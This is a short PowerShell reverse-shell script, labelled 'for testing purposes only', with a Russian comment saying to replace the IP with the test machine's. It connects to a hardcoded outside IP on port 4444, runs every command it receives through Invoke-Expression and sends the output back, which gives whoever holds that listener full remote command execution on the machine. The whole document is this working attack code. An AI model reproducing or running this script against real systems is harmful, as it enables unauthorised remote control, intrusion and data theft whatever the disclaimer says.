# Reverse Shell Script (for testing purposes only)
$client = New-Object System.Net.Sockets.TcpClient("146.103.97.158", 4444); # Замени на IP тестовой машины
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object Text.UTF8Encoding).GetString($buffer, 0, $i);
    $result = (iex $data 2>&1 | Out-String);
    $send = ([text.encoding]::UTF8).GetBytes($result);
    $stream.Write($send, 0, $send.Length);
}
$client.Close();